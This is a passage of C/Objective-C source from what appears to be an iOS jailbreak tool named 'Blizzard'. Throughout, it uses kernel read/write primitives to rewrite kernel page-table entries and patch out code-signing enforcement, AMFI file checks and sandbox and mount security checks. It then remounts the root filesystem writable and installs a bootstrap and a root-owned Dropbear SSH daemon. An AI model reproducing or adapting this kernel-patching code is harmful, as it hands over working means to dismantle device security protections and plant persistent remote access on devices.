    uint32_t tte_virt               = ReadKernel32(kernel_pmap_store);
    uint32_t tte_phys               = ReadKernel32(kernel_pmap_store+4);
    
    if (kernel_pmap == 0) {
        printf("[!] Failed to locate Kernel PMAP. Aborting...\n");
        return -1;
    } else {
        printf("[i] Got Kernel PMAP at 0x%x\n", kernel_pmap);
    }
    
    printf("  -- [i] Found Kernel PMAP Store at 0x%08x\n", kernel_pmap_store);
    printf("  -- [i] The Kernel PMAP TTE is at Virtual Address 0x%08x / Physical Address 0x%08x\n", tte_virt, tte_phys);
    
    uint32_t i;
    for (i = 0; i < TTB_SIZE; i++) {
        uint32_t addr   = tte_virt + (i << 2);
        uint32_t entry  = ReadKernel32(addr);
        if (entry == 0) continue;
        if ((entry & 0x3) == 1) {
            uint32_t lvl_pg_addr = (entry & (~0x3ff)) - tte_phys + tte_virt;
            for (int i = 0; i < 256; i++) {
                uint32_t sladdr  = lvl_pg_addr+(i<<2);
                uint32_t slentry = ReadKernel32(sladdr);
                
                if (slentry == 0)
                    continue;
                
                uint32_t new_entry = slentry & (~0x200);
                if (slentry != new_entry) {
                    WriteKernel32(sladdr, new_entry);
                    pmaps[page_maps_count++] = sladdr;
                }
            }
            continue;
        }
        
        if ((entry & L1_SECT_PROTO) == 2) {
            uint32_t new_entry  =  L1_PROTO_TTE(entry);
            new_entry           &= ~L1_SECT_APX;
            WriteKernel32(addr, new_entry);
        }
    }
    
    printf("[+] Successfully patched Kernel PMAP!\n");
    usleep(100000);
    return 0;
}

int patch_mount_common(){
    uint32_t mount_common = KernelBase + find_mount_check(KernelBase, kdata, 32 * 1024 * 1024);
    printf("  -- [i] Found mount_common at 0x%08x\n", mount_common);
    if (WriteKernel8(mount_common, 0xe0) != 0) {
        printf("[+] Successfully patched mount_common MACF check. \n");
        return 0;
    } else {
        return -1;
    }
}

int patch_cs_enforcement_disable(){
    uint32_t cs_enforcement_disable_amfi = find_cs_enforcement_disable_amfi(KernelBase, kdata, ksize);
    printf("  -- [i] Patching cs_enforcement_disable at 0x%08x\n", cs_enforcement_disable_amfi);
    if (WriteKernel8(KernelBase + cs_enforcement_disable_amfi, 1) &&
        WriteKernel8(KernelBase + cs_enforcement_disable_amfi - 1, 1) != 0) {
        printf("[+] Succesfully patched cs_enforcement_disable!\n");
        return 0;
    } else {
        return -1;
    }
}

int patch_amfi_pe_i_can_has_debugger(){
    uint32_t PE_i_can_has_debugger_1 = find_PE_i_can_has_debugger_uno(KernelBase, kdata, ksize);
    printf("   -- [i] Patching PE_i_can_has_debugger_1 at 0x%08x\n",PE_i_can_has_debugger_1);
    WriteKernel32(KernelBase + PE_i_can_has_debugger_1, 1);
    return 0;
}

int patch_second_amfi_pe_i_can_has_debugger(){
    uint32_t PE_i_can_has_debugger_2 = find_PE_i_can_has_debugger_dos(KernelBase, kdata, ksize);
    printf("   -- [i] Patching PE_i_can_has_debugger_2 at 0x%08x\n",PE_i_can_has_debugger_2);
    WriteKernel32(KernelBase + PE_i_can_has_debugger_2, 1);
    return 0;
}

int patch_amfi_mmap(){
    uint32_t amfi_file_check_mmap = find_amfi_file_check_mmap(KernelBase, kdata, ksize);
    printf("   -- [i] Patching amfi_file_check_mmap at 0x%08lx\n", KernelBase + amfi_file_check_mmap);
    WriteKernel32(KernelBase + amfi_file_check_mmap, 0xbf00bf00);
    return 0;
}

int patch_sb_i_can_has_debugger(){
    uint32_t sbdebug = find_sb_i_can_has_debugger(KernelBase, kdata, ksize);
    printf("  -- [i] Patching Sandbox' i_can_has_debugger at 0x%08lx\n", KernelBase + sbdebug);
    if (WriteKernel32(KernelBase + sbdebug, 0xbf00bf00) != 0) {
        printf("[+] Successfully patched Sandbox' i_can_has_debugger.\n");
        return 0;
    } else {
        return -1;
    }
}

int blizzardRemountRootFS(){
    FILE *testCase = fopen("/.blizzard", "w");
    if (!testCase) {
        printf("[i] The Root File System is Read-Only.\n");
    }
    else {
        printf("[!] Already remounted Root File System as Read / Write. Wot...\n");
        return -2;
    }
    
    uint32_t lwvm_call = find_lwvm_call(KernelBase, kdata, ksize);
    uint32_t lwvm_call_offset = find_lwvm_call_offset(KernelBase, kdata, ksize);
    printf("   -- [i] Patching lwvm_call at 0x%08lx\n",
         KernelBase + lwvm_call);
    printf("   -- [i] Patching lwvm_call_offset at 0x%08lx\n",
         KernelBase + lwvm_call_offset);
    WriteKernel32(KernelBase + lwvm_call, KernelBase + lwvm_call_offset);
    
    printf("[i] Remounting the Root File System as Read / Write...\n");
    char *volume = strdup("/dev/disk0s1s1");
    int mountpoint = mount("hfs", "/", MNT_UPDATE, &volume);
    printf("   -- [i] Root File System Remount Status: %d\n", mountpoint);
    printf("[i] Testing current Root File System conditions...\n");
    FILE *testFile = fopen("/.blizzard", "w");
    if (!testFile) {
        printf("[!] Failed to remount the Root File System! Patch failed.\n");
        return -2;
    }
    else {
        printf("[+] Successfully remounted Root File System as Read / Write\n");
    }
    return 0;
}

int getBootstrapReady(){
    printf("   -- [i] Getting bootstrap components ready...\n");
    NSString *tarBinaryPath = [[[NSBundle mainBundle] resourcePath]stringByAppendingString:@"/tar"];
    const char *tarApplication = [tarBinaryPath UTF8String];
    
    NSString *BlizzardBootstrapPath = [[[NSBundle mainBundle] resourcePath]stringByAppendingString:@"/blizzard.tar"];
    const char *blizzardBootstrapArchive = [BlizzardBootstrapPath UTF8String];
    
    NSString *blizzardLaunchCtlPath = [[[NSBundle mainBundle] resourcePath]stringByAppendingString:@"/launchctl"];
    const char *launchctlPath = [blizzardLaunchCtlPath UTF8String];
    
    if (blizzardBootstrapArchive == NULL || tarApplication == NULL) {
        printf("   -- [!] Failed to locate Bootstrap files...\n");
        return -2;
    }
    
    printf("   -- [i] Fixing Bootstrap permissions...\n");
    chmod(blizzardBootstrapArchive, 0777);
    chmod(tarApplication, 0777);
    
    if (blizzardInstallBootstrap(tarApplication, blizzardBootstrapArchive, launchctlPath) != 0) {
        printf("[!] Failed to get Bootstrap installed.\n");
        return -1;
    }
    return 0;
}

int initWithCydiaFixup(){
    printf("   -- [i] Disabling Cydia's Stashing...\n");
    spawnBinaryAtPath("/bin/touch /.cydia_no_stash");
    
    if (copyfile([[[NSBundle mainBundle] resourcePath]stringByAppendingString:@"/cydia.list"].UTF8String, "/etc/apt/sources.list.d/cydia.list", NULL, COPYFILE_ALL) != 0){
        printf("   -- [!] Failed to copy sources file.\n");
    }
    return 0;
}

int fixBinaryPermissions(){
    mkdir("/Library/LaunchDaemons", 0777);
    mkdir("/var/mobile/BlizzardTemp", 0755);
    chmod("/bin/tar", 0755);
    chmod("/bin/launchctl", 0755);
    chmod("/private", 0755);
    chmod("/private/var", 0755);
    chmod("/private/var/mobile", 0711);
    chmod("/private/var/mobile/Library", 0711);
    chmod("/private/var/mobile/Library/Preferences", 0755);
    return 0;
}

int installDropbearSSH(){
    mkdir("/usr/local", 0777);
    mkdir("/usr/local/bin", 0777);
    mkdir("/etc/dropbear/", 0777);
    unlink("/Library/LaunchDaemons/dropbear.plist");
    
    if (copyfile([[[NSBundle mainBundle] resourcePath]stringByAppendingString:@"/dropbear"].UTF8String, "/usr/local/bin/dropbear", NULL, COPYFILE_ALL) != 0 && copyfile([[[NSBundle mainBundle] resourcePath]stringByAppendingString:@"/dropbearconvert"].UTF8String, "/usr/local/bin/dropbearconvert", NULL, COPYFILE_ALL) != 0 && copyfile([[[NSBundle mainBundle] resourcePath]stringByAppendingString:@"/dropbearkey"].UTF8String, "/usr/local/bin/dropbearkey", NULL, COPYFILE_ALL) != 0 && copyfile([[[NSBundle mainBundle] resourcePath]stringByAppendingString:@"/motd"].UTF8String, "/etc/motd", NULL, COPYFILE_ALL) != 0 && copyfile([[[NSBundle mainBundle] resourcePath]stringByAppendingString:@"/dropbear.plist"].UTF8String, "/Library/LaunchDaemons/dropbear.plist", NULL, COPYFILE_ALL) != 0){
        printf("[!] Could not install Dropbear!\n");
        return -1;
    }
    chmod("/usr/local/bin/dropbear", 0775);
    chown("/usr/local/bin/dropbear", 0, 0);
    
    chmod("/usr/local/bin/dropbearkey", 0775);
    chown("/usr/local/bin/dropbearkey", 0, 0);
    
    chmod("/usr/local/bin/dropbearconvert", 0775);
    chown("/usr/local/bin/dropbearconvert", 0, 0);
    
    chmod("/Library/LaunchDaemons/dropbear.plist", 0644);
    chown("/Library/LaunchDaemons/dropbear.plist", 0, 0);
    return 0;
}

int copyBaseBinariesToPath(){
    if (copyfile([[[NSBundle mainBundle] resourcePath]stringByAppendingString:@"/tar"].UTF8String, "/bin/tar", NULL, COPYFILE_ALL) != 0){
        printf("[!] Failed to copy TAR binary.\n");
        return -1;
    }
    
    if (copyfile([[[NSBundle mainBundle] resourcePath]stringByAppendingString:@"/launchctl"].UTF8String, "/bin/launchctl", NULL, COPYFILE_ALL) != 0){
        printf("[!] Failed to copy launchctl binary!\n");
        return -1;
    }
    return 0;
}

int installBlizzardMarkerAthPath(){
    printf("   -- [i] Installing .blizzardJB marker...\n");
    FILE* blizzardJB = fopen("/.blizzardJB", "w");
    
    if (blizzardJB != NULL){
        printf("   -- [+] Successfully created .blizzardJB marker file.\n");
        fclose(blizzardJB);
        return 0;
    }
    
    printf("   -- [!] FAILED to create .blizzardJB marker file. Jailbreak Failed.\n");
    fclose(blizzardJB);
    return -1;
}

int respringDeviceNow(){
    printf("[i] Device is respringing now...\n");
    char *backboardd[] = {"killall", "-9", "backboardd",NULL};
    posix_spawn(&processID, "/usr/bin/killall", NULL, NULL, backboardd, environment);
    return 0;
}

int fixSpringBoardApplications(){
    printf("   -- [i] Fixing SpringBoard Non-Default System Apps...\n");
    NSMutableDictionary *sbpath = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
    [sbpath setObject:[NSNumber numberWithBool:YES] forKey:@"SBShowNonDefaultSystemApps"];
    [sbpath writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES];
    
    processID = 0;
    char *cfprefsd[] = {"killall", "-9", "cfprefsd",NULL};
    posix_spawn(&processID, "/usr/bin/killall", NULL, NULL, cfprefsd, environment);
    
    if (processID != 0){
        printf("   -- [+] Successfully enabled non-default SpringBoard applications!\n");
        return 0;
    }
    printf("   -- [!] Could not enable non-default SpringBoard applications!\n");
    return -1;
}

int loadBlizzardLaunchDaemons(){
    printf("[i] Blizzard is loading LaunchDaemons...\n");
    spawnBinaryAtPath("/bin/launchctl load /Library/LaunchDaemons/*");
    return 0;
}

int checkIfBootstrapPresent(){
    if(((access("/.blizzardJB", F_OK) != -1) || (access("/.installed_home_depot", F_OK) != -1))){
        printf("[!] There already is a Bootstrap installed. Won't re-extract. \n");
        return -1;
    }
    return 0;
}

int blizzardInstallBootstrap(const char *tarbin, const char* bootstrap, const char * launchctl){
    printf("   -- [i] Extracting Bootstrap Archive...\n");
    char *argv[] = {tarbin, "-xf",
                    bootstrap, "-C", "/", "--preserve-permissions",
                    NULL};
    
    if (posix_spawn(&processID, tarbin, NULL, NULL, argv, environment) != 0){
        printf("[!] Failed to extract Bootstrap Archive.\n");
        return -1;
    }
    
    initWithCydiaFixup();
    copyBaseBinariesToPath();
    fixBinaryPermissions();
    
    if (installBlizzardMarkerAthPath() != 0) {
        return -1;
    }
    
    sync();
    printf("[+] Finished installing Bootstrap!\n");
    return 0;
}

int blizzardPostInstFixup(){
    fixSpringBoardApplications();
    spawnBinaryAtPath("su -c uicache mobile &");
    loadBlizzardLaunchDaemons();
    respringDeviceNow();
    printf("[+] JAILBREAK SUCCEEDED!\n");
    return 0;
}
